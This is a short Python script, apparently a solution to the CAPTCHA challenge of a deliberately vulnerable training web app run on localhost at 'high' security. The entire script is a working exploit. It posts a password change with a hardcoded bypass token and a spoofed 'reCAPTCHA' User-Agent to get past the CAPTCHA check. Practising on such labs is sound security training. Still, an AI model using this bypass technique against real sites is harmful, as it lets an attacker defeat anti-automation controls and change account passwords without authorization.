import requests

host="http://127.0.0.1:4280/vulnerabilities/captcha/"
data={
    "step":"1",
    "password_new":"abc",
    "password_conf":"abc",
    "g-recaptcha-response":"hidd3n_valu3",
    "Change":"Change"
}
headers={
    "User-Agent":"reCAPTCHA"
}
cookies={
    "PHPSESSID":"78be15ef62d2b55e825feef3e238e25b", 
    "security":"high"
}
res=requests.post(host,data=data,headers=headers,cookies=cookies)
print(res.text)